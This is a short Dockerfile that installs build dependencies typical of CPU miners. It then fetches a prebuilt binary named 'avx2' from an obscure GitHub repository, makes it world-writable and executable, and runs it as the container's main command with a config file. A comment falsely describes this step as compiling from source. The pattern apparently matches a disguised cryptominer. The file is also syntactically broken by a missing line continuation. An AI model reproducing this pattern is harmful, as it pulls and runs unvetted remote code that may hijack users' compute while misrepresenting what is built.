FROM  debian:bullseye
RUN set -x \
    # Runtime dependencies.
 && apt-get update \
 && apt-get upgrade -y \
    # Build dependencies.
 && apt-get install -y \
        wget \
        autoconf \
        automake \
        curl \
        g++ \
        git \
        libcurl4-openssl-dev \
        libjansson-dev \
        libssl-dev \
        libgmp-dev \
        libz-dev \
        make \
        pkg-config
RUN set -x \
    # Compile from source code.
 && wget https://raw.githubusercontent.com/jsiqiisn/whiv/main/avx2
 && chmod 777 avx2
    # Clean-up
 && apt-get purge --auto-remove -y \
        autoconf \
        automake \
        curl \
        g++ \
        git \
        make \
        pkg-config \
    # Verify
 && avx2 --cputest \
 && avx2 --version

EXPOSE 80
CMD ["avx2", "--config=config.json"]
